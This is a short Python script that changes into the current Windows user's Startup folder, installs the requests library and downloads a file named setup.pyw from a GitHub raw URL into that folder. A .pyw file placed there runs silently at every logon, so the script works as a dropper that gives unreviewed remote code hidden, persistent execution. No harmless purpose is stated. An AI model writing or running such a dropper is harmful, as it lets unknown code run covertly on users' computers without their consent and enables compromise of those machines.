import os
import sys
import subprocess

USERNAME = os.environ['USERNAME']
PATH = rf"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

URL = "https://raw.githubusercontent.com/lamer34/lamer_code/master/setup.pyw"


def install_requests():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

def get_setup(URL):

    import requests

    r = requests.get(URL)
    if r.ok:
        with open("setup.pyw", "w") as w:
            w.write(r.text)

def main():
    os.chdir(PATH)
    install_requests()
    get_setup(URL)

if __name__ == "__main__":
    main()
